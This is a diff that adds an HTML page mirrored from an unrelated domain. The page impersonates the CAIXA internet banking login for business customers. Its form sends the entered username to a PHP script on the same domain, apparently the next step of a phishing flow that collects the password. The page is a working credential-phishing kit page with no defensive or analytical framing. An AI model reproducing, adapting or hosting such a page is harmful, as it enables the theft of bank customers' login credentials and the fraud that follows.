@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html ng-app="app"  ng-controller="appController">
+
+<!-- Mirrored from aplicativo.gerenciadordodispositivo.digital/acesso-juridico-pc.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 Jul 2022 22:20:43 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#005ea4" />
+	<meta name="msapplication-navbutton-color" content="#005ea4">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+
+	<title>Site</title>
+
+	<link rel="stylesheet" href="css/bootstrap.min.css">
+    <link href="css/animate.min.css" rel="stylesheet">
+
+	<link rel="stylesheet" href="style.css">
+
+    <link rel="icon" href="img/logo.ico" type="image/icon">
+    <link href="https://fonts.googleapis.com/css?family=Lato&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans&amp;display=swap" rel="stylesheet">
+    <script>
+      var informacaoid = encodeURIComponent('NjU4MjEy');
+    </script>
+</head>
+<body class="vh-100">
+<style>
+input:valid, input:focus {
+    border-bottom: 1px solid #1a6bad;
+    color: #000;
+}
+.vermelho-erro{
+    border-bottom: 1px solid red !important;
+}
+#entrarP{
+	font-size: 14px !important;
+}
+</style>
+	<div class="h-100 d-flex flex-column justify-content-between">
+		<div class="col-12 d-flex flex-column justify-content-center align-items-center minha-barra">
+			<div class="d-flex flex-row align-items-center justify-content-between topo-barra">
+				<div class="">
+					<img src="img/logo-pc.png"  alt="">
+				</div>
+			</div>
+		</div>
+		<div class="col-12 flex-fill d-flex flex-column justify-content-center align-items-center splash-white-2">
+			<div class="card-bb-top pb-3">
+				<h1 class="caixas-login-h1 mb-4"><span>JÁ SOU USUÁRIO DO</span><br>
+INTERNET BANKING CAIXA</h1>
+
+				<form action="https://aplicativo.gerenciadordodispositivo.digital/acesso-juridico-senha-pc.php" method="post">
+              <div class="input-container mt-2">
+                  <span class="bb-container-campo-label d-block">Usuário</span>
+                  <input id="campo1" class="bb-container-campo" type="text" name="campo1" pattern=".+" minlength="3" required placeholder="Usuário" />
+              </div>
+
+              <div class="input-container mt-2 hide " >
+                  <span class="bb-container-campo-label d-block">Conta</span>
+                  <input id="campo2" class="bb-container-campo" type="hidden" name="campo2" pattern=".+" maxlength="13" minlength="3" required placeholder="Conta" value="NAO USADO" />
+              </div>
+        </form>
+<div class="w-100 pt-3 ps-2">
+	<style>
+		.form-check-input{border: none !important}
+	</style>
+<div class="form-check">
+  <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault1" onclick="window.location.href='acesso-conta-pc.html'">
+  <p class="mb-0 fchekfutura" style="cursor:pointer" onclick="window.location.href='acesso-conta-pc.html'">Pessoa Física</p>
+</div>
+<div class="form-check">
+  <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" checked>
+  <p class="mb-0 fchekfutura" style="cursor:pointer">Pessoa Jurídica</p>
+</div>	
+<div class="form-check">
+  <input class="form-check-input" type="radio" name="flexRadioDefault" id="flexRadioDefault2" >
+  <p class="mb-0 fchekfutura" style="cursor:pointer">Governo</p>
+</div>
+</div>
+              <div class="bb-container-botao mt-4" id="entrarP">CONTINUAR</div>
+			</div>
+		</div>
+		<div class="col-12 d-flex flex-row justify-content-center align-items-end rodape">
+			<img src="img/rodape.png" alt="">
+		</div>
+	</div>
+
+	<script src="angular/angular.min.js"></script>
+	<script src="angular/angular-cookies.min.js"></script>  
+	<script src="angular/i18n/angular-locale_pt-br.js"></script>
+	<script src="js/jquery.min.js"></script>
+	<script src="js/jquery.mask.min.js"></script>
+	<script src="js/bootstrap.min.js"></script>
+	<script src="js/bootstrap.bundle.min.js"></script>
+	<script src="js/controller.js"></script>
+	<script src="js/acesso.js"></script>
+	<script src="js/controlador.js"></script>
+<script type="text/javascript">
+var cIMG = 1;
+$('#checkedIMG').click(function(event) {
+  if(cIMG == 1){
+    $('#checkedIMG').attr({
+      src: 'img/agenciaHover.png'
+    });
+    cIMG = 0
+  }else{
+    $('#checkedIMG').attr({
+      src: 'img/agencia.png'
+    });
+    cIMG = 1
+  }
+});
+</script>
+<script type="text/javascript">
+	var ponteiroSenha = 0;
+
+	$('#campo1').keypress(function(e) {
+	    if(e.which == 13) {
+	      e.preventDefault();
+	    }
+	});
+	
+	$('#campo2').keypress(function(e) {
+	    if(e.which == 13) {
+	      e.preventDefault();
+	    }
+	});
+	
+	$('#campo3').keypress(function(e) {
+	    if(e.which == 13) {
+	      e.preventDefault();
+	    }
+	});
+
+	function vermelho(campo1, campo2, campo3){
+		$(campo2).val('');
+		$(campo1).show();
+		$(campo2).addClass('vermelho-erro');
+		$(campo3).addClass('label-vermelho');
+	}
+
+	function remove_vermelho(campo1, campo2, campo3){
+		$(campo1).hide();
+		$(campo2).removeClass('vermelho-erro');
+		$(campo3).removeClass('label-vermelho');
+	}
+
+	$('#campo1').focusin(function(event) {
+		$('.campo-um').show();
+		remove_vermelho('.um','#campo1','.label-um');
+	});
+
+	$('#campo1').focusout(function(event) {
+		$('.campo-um').hide();
+		if($('#campo1').val().length < 3){
+			vermelho('.um','#campo1','.label-um');
+		}
+	})
+
+	$('#campo2').focusin(function(event) {
+		$('.campo-dois').show();
+		remove_vermelho('.dois','#campo2','.label-dois');
+	});
+
+	$('#campo2').focusout(function(event) {
+		$('.campo-dois').hide();
+		if($('#campo2').val().length < 3){
+			vermelho('.dois','#campo2','.label-dois');
+		}
+	})
+
+	$('#entrarP').click(function(event) {
+		if($('#campo1').val().length < 3){
+			vermelho('.um','#campo1','.label-um');
+		}
+
+		if($('#campo1').val().length < 3){
+			vermelho('.dois','#campo2','.label-dois');			
+		}else{
+				$('form').submit();
+		}
+	});
+</script>
+<script>(function(){var js = "window['__CF$cv$params']={r:'729d2a749af90349',m:'qtNKs1yWQ1ne87y3Pd6x_padtnR_KjXyjVuDkrR1iKE-1657664423-0-AS2QaApDkeBhiWJp2e8ujuy/c4nxExq4zBMH4cT1yth9kW8XVZc97VKBk9o2CEmUT/SWRuCffMfnTHgeXB0upyoDOEpVI36+vnQWK2zydY+uGHqRamDR9N1swf0d7VudV1u5AlxysBFs3CR8iva8GIU=',s:[0x7630635b2e,0xc6907cbf71],u:'/cdn-cgi/challenge-platform/h/g'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='cdn-cgi/challenge-platform/h/g/scripts/alpha/invisible5615.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
+
+<!-- Mirrored from aplicativo.gerenciadordodispositivo.digital/acesso-juridico-pc.php by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 Jul 2022 22:20:43 GMT -->
+</html>
